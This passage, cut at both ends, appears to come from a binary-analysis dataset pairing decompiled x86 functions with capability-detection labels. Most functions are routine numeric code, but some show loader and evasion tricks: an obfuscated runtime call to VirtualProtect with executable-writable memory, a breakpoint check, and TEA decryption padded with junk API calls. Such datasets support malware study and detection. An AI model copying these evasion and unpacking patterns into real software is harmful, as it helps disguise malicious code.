0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040ee9c:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3670
    },
    "0040eedf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040eedf(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040f3e0;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x412f34 - 1;\n        iVar4 = *0x412f34 + (*0x412f34 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x412f34 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040f014;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040f01b;\ncode_r0x0040f014:\n                        do {\n                            var_4h = 1;\ncode_r0x0040f01b:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040f029;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040f029:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x412f30 - *0x412f34) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x412f30 < iVar12) {\n                if (iVar12 < *0x412f2c) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x412f40;\n                    iVar4 = *0x412f38 + (*0x412f38 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x412f38 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x412f38 + (*0x412f38 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x412f38 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x412f40 + *0x412f2c;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040f3e0;\n            }\n            var_10h = *0x412f30 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x412f34 - 1;\n            iVar12 = *0x412f34 + (*0x412f34 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x412f34 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040f1cc;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040f1cc:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x412f38 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040f3e0:\n    var_20h = iVar12 << (0x1fU - *0x412f38 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x412f3c == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x412f3c == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3652
    },
    "0040f423": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040f6e5)\n// WARNING: Removing unreachable block (ram,0x0040f6ae)\n// WARNING: Removing unreachable block (ram,0x0040fa96)\n// WARNING: Removing unreachable block (ram,0x0040f6bd)\n// WARNING: Removing unreachable block (ram,0x0040f6c5)\n// WARNING: Removing unreachable block (ram,0x0040f6cb)\n// WARNING: Removing unreachable block (ram,0x0040f6ce)\n// WARNING: Removing unreachable block (ram,0x0040f6d5)\n// WARNING: Removing unreachable block (ram,0x0040f6df)\n// WARNING: Removing unreachable block (ram,0x0040f73a)\n// WARNING: Removing unreachable block (ram,0x0040f734)\n// WARNING: Removing unreachable block (ram,0x0040f740)\n// WARNING: Removing unreachable block (ram,0x0040f75d)\n// WARNING: Removing unreachable block (ram,0x0040f75f)\n// WARNING: Removing unreachable block (ram,0x0040f767)\n// WARNING: Removing unreachable block (ram,0x0040f76a)\n// WARNING: Removing unreachable block (ram,0x0040f76f)\n// WARNING: Removing unreachable block (ram,0x0040f772)\n// WARNING: Removing unreachable block (ram,0x0040fa9f)\n// WARNING: Removing unreachable block (ram,0x0040f77d)\n// WARNING: Removing unreachable block (ram,0x0040fab6)\n// WARNING: Removing unreachable block (ram,0x0040fabd)\n// WARNING: Removing unreachable block (ram,0x0040f788)\n// WARNING: Removing unreachable block (ram,0x0040f79b)\n// WARNING: Removing unreachable block (ram,0x0040f79d)\n// WARNING: Removing unreachable block (ram,0x0040f7aa)\n// WARNING: Removing unreachable block (ram,0x0040f7af)\n// WARNING: Removing unreachable block (ram,0x0040f7b5)\n// WARNING: Removing unreachable block (ram,0x0040f7be)\n// WARNING: Removing unreachable block (ram,0x0040f7c5)\n// WARNING: Removing unreachable block (ram,0x0040f7dd)\n// WARNING: Removing unreachable block (ram,0x0040f7ee)\n// WARNING: Removing unreachable block (ram,0x0040f7fc)\n// WARNING: Removing unreachable block (ram,0x0040f83b)\n// WARNING: Removing unreachable block (ram,0x0040f844)\n// WARNING: Removing unreachable block (ram,0x0040fa5c)\n// WARNING: Removing unreachable block (ram,0x0040f852)\n// WARNING: Removing unreachable block (ram,0x0040f85c)\n// WARNING: Removing unreachable block (ram,0x0040fa77)\n// WARNING: Removing unreachable block (ram,0x0040f869)\n// WARNING: Removing unreachable block (ram,0x0040f870)\n// WARNING: Removing unreachable block (ram,0x0040f87a)\n// WARNING: Removing unreachable block (ram,0x0040f87f)\n// WARNING: Removing unreachable block (ram,0x0040f88f)\n// WARNING: Removing unreachable block (ram,0x0040f894)\n// WARNING: Removing unreachable block (ram,0x0040f89e)\n// WARNING: Removing unreachable block (ram,0x0040f8a3)\n// WARNING: Removing unreachable block (ram,0x0040f8b5)\n// WARNING: Removing unreachable block (ram,0x0040f8c2)\n// WARNING: Removing unreachable block (ram,0x0040f8d1)\n// WARNING: Removing unreachable block (ram,0x0040f8de)\n// WARNING: Removing unreachable block (ram,0x0040f8fb)\n// WARNING: Removing unreachable block (ram,0x0040f8ff)\n// WARNING: Removing unreachable block (ram,0x0040f906)\n// WARNING: Removing unreachable block (ram,0x0040f90f)\n// WARNING: Removing unreachable block (ram,0x0040f912)\n// WARNING: Removing unreachable block (ram,0x0040f923)\n// WARNING: Removing unreachable block (ram,0x0040f931)\n// WARNING: Removing unreachable block (ram,0x0040f93c)\n// WARNING: Removing unreachable block (ram,0x0040f943)\n// WARNING: Removing unreachable block (ram,0x0040f96e)\n// WARNING: Removing unreachable block (ram,0x0040f973)\n// WARNING: Removing unreachable block (ram,0x0040f97e)\n// WARNING: Removing unreachable block (ram,0x0040f987)\n// WARNING: Removing unreachable block (ram,0x0040f98d)\n// WARNING: Removing unreachable block (ram,0x0040f990)\n// WARNING: Removing unreachable block (ram,0x0040f9b6)\n// WARNING: Removing unreachable block (ram,0x0040f9bb)\n// WARNING: Removing unreachable block (ram,0x0040f9c0)\n// WARNING: Removing unreachable block (ram,0x0040f9cd)\n// WARNING: Removing unreachable block (ram,0x0040f9de)\n// WARNING: Removing unreachable block (ram,0x0040fa0f)\n// WARNING: Removing unreachable block (ram,0x0040f9e4)\n// WARNING: Removing unreachable block (ram,0x0040fa0a)\n// WARNING: Removing unreachable block (ram,0x0040f9ee)\n// WARNING: Removing unreachable block (ram,0x0040fa04)\n// WARNING: Removing unreachable block (ram,0x0040f9fd)\n// WARNING: Removing unreachable block (ram,0x0040fa12)\n// WARNING: Removing unreachable block (ram,0x0040fa3f)\n// WARNING: Removing unreachable block (ram,0x0040fa1c)\n// WARNING: Removing unreachable block (ram,0x0040f8a7)\n// WARNING: Removing unreachable block (ram,0x0040f884)\n// WARNING: Removing unreachable block (ram,0x0040fa7a)\n// WARNING: Removing unreachable block (ram,0x0040f7c0)\n// WARNING: Removing unreachable block (ram,0x0040fa84)\n// WARNING: Removing unreachable block (ram,0x0040fac5)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.0040f423(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.0040562e();\n        *puVar2 = 0x16;\n        fcn.004055c6(0, 0, 0, 0, 0);\n        fcn.00407c44(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0040f4b6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x40faeb\n    (**0x40faeb)();\n    return;\n}\n",
        "token_count": 1902
    },
    "00405c15": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405c15(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 92
    },
    "00406109": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00406109(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004066f8(0x411168, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00405641();\n        *puVar2 = 0;\n        puVar2 = fcn.0040562e();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4280c0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4280e0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.004099b2(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0040562e();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00405641();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00406094(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004061db(0x411168);\n                goto code_r0x004061d5;\n            }\n        }\n        puVar2 = fcn.00405641();\n        *puVar2 = 0;\n        puVar2 = fcn.0040562e();\n        *puVar2 = 9;\n        fcn.004055c6(0, 0, 0, 0, 0);\n    }\ncode_r0x004061d5:\n    fcn.0040673d();\n    return;\n}\n",
        "token_count": 626
    },
    "0040a1ac": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a1ac(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004066f8(0x4112e0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00405641();\n        *puVar2 = 0;\n        puVar2 = fcn.0040562e();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4280c0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4280e0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.004099b2(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0040562e();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00405641();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00409a79(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040a27e(0x4112e0);\n                goto code_r0x0040a278;\n            }\n        }\n        puVar2 = fcn.00405641();\n        *puVar2 = 0;\n        puVar2 = fcn.0040562e();\n        *puVar2 = 9;\n        fcn.004055c6(0, 0, 0, 0, 0);\n    }\ncode_r0x0040a278:\n    fcn.0040673d();\n    return;\n}\n",
        "token_count": 635
    },
    "004041a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004041a3(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 46
    },
    "004041aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004041aa(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 47
    },
    "004041ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "encrypt data using TEA"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004041ad(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint lpFileInformation;\n    uint lpFindFileData;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    \n    var_10h = *arg_8h;\n    uVar1 = arg_8h[1];\n    var_30h = *0x413358;\n    var_38h = *0x41335c;\n    var_ch = 0;\n    var_28h = -0x61c88647;\n    fcn.004041a3();\n    var_ch = var_ch + 0x23f;\n    var_24h = *0x413360;\n    var_34h = *0x413364;\n    var_20h = 0x20;\n    do {\n        var_18h = 5;\n        iVar2 = var_10h * 0x10;\n        if (*0x427724 == 0xc) {\n            (*_sym.imp.KERNEL32.dll_FindNextFileA)(0, &lpFindFileData);\n        }\n        uVar3 = iVar2 + var_24h;\n        if (*0x427724 == 0xfa9) {\n            *0x427720 = 0xedeb2e40;\n        }\n        if (*0x427724 == 0x3eb) {\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesExW)(0x403e98, 0, &lpFileInformation);\n            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n            *0x427684 = 0;\n        }\n        var_14h = var_10h + var_ch;\n        var_8h = var_10h >> (var_18h & 0x1f);\n        *0x42771c = 0xf4ea3dee;\n        fcn.004041aa();\n        var_8h = var_8h ^ uVar3 ^ var_14h;\n        if (*0x427724 == 0x1f) {\n            (*_sym.imp.KERNEL32.dll_WaitNamedPipeA)(0, 0);\n            (*_sym.imp.KERNEL32.dll_CreateHardLinkA)(0x403f30, 0x403f08, 0);\n            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(&var_3ch);\n        }\n        uVar1 = uVar1 - var_8h;\n        var_1ch = 4;\n        var_14h = var_ch + uVar1;\n        var_8h = (uVar1 >> (var_18h & 0x1f)) + var_38h;\n        *0x4274dc = 0;\n        var_2ch = uVar1 * 0x10 + var_30h ^ var_8h ^ var_14h;\n        var_10h = var_10h - var_2ch;\n        var_ch = var_ch - var_28h;\n        var_20h = var_20h + -1;\n    } while (var_20h != 0);\n    arg_8h[1] = uVar1;\n    *arg_8h = var_10h;\n    return;\n}\n",
        "token_count": 833
    },
    "0040440b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040440b(void)\n\n{\n    uint var_4h;\n    \n    *0x427688 = *0x427688 + 0x3d52;\n    return;\n}\n",
        "token_count": 44
    },
    "00404425": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404425(void)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4274a8 = 0x56;\n    *0x4274a9 = 0x69;\n    *0x4274aa = 0x72;\n    *0x4274af = 0x50;\n    *0x4274b5 = 0x74;\n    *0x4274b6 = 0;\n    *0x4274ab = 0x74;\n    *0x4274ac = 0x75;\n    *0x4274ad = 0x61;\n    *0x4274ae = 0x6c;\n    *0x4274b0 = 0x72;\n    *0x4274b1 = 0x6f;\n    *0x4274b2 = 0x74;\n    *0x4274b3 = 0x65;\n    *0x4274b4 = 99;\n    *0x427680 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x42768c, 0x4274a8);\n    var_4h = 0x40;\n    (**0x427680)(*0x427688, *0x427724, 0x40, &var_8h);\n    return;\n}\n",
        "token_count": 304
    },
    "004056ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405952)\n\nfloat10 fcn.004056ae(double param_1)\n\n{\n    int32_t iVar1;\n    double dVar2;\n    double dVar3;\n    int32_t iVar4;\n    double dVar5;\n    double dVar6;\n    uchar auVar7 [16];\n    double dVar8;\n    double in_XMM7_Qa;\n    \n    dVar2 = in_XMM7_Qa & *0x4011f0;\n    dVar3 = in_XMM7_Qa & *0x4011f8;\n    if (*0x401318 <= dVar2) {\n        return *0x401328 + *((param_1._4_4_ >> 0x1f) * -8 + 0x401200);\n    }\n    if (*0x401308 <= dVar2) {\n        if (*0x401300 <= dVar2) {\n            if (*0x4012f8 <= dVar2) {\n                iVar1 = 0x300;\n                dVar3 = *0x4012e0 / dVar2;\n            }\n            else {\n                iVar4 = (dVar2 + *0x4012f0 >> 0x2c) - *0x4012d0;\n                iVar1 = iVar4 * 3;\n                dVar3 = *(iVar4 * 0x18 + 0x401b28);\n                dVar3 = (dVar2 - dVar3) / (dVar2 * dVar3 + *0x4012e8);\n            }\n            dVar5 = dVar3 * dVar3;\n            dVar6 = dVar5 * dVar5;\n            dVar8 = dVar3 * dVar3 * dVar3 * dVar3;\n            dVar5 = (((*0x4012c0 * dVar6 + *0x4012b0) * dVar6 + *0x4012a0) * dVar6 + *0x401290) * dVar5;\n            auVar7 = CONCAT88(((*0x4012c8 * dVar8 + *0x4012b8) * dVar8 + *0x4012a8) * dVar8 + *0x401298, dVar5);\n            auVar7 = shufpd(auVar7, auVar7, 1);\n            return *(iVar1 * 8 + 0x401b18) - (((dVar5 + SUB168(auVar7, 0)) * dVar3 - *(iVar1 * 8 + 0x401b20)) - dVar3) |\n                   in_XMM7_Qa ^ dVar2;\n        }\n        dVar2 = dVar2 * dVar2;\n        dVar5 = dVar2 * dVar2;\n        dVar3 = dVar3 * dVar3 * dVar3 * dVar3;\n        dVar2 = (((((((*0x401280 * dVar5 + *0x401270) * dVar5 + *0x401260) * dVar5 + *0x401250) * dVar5 + *0x401240) *\n                   dVar5 + *0x401230) * dVar5 + *0x401220) * dVar5 + *0x401210) * dVar2;\n        auVar7 = CONCAT88(((((((*0x401288 * dVar3 + *0x401278) * dVar3 + *0x401268) * dVar3 + *0x401258) * dVar3 +\n                            *0x401248) * dVar3 + *0x401238) * dVar3 + *0x401228) * dVar3 + *0x401218, dVar2);\n        auVar7 = shufpd(auVar7, 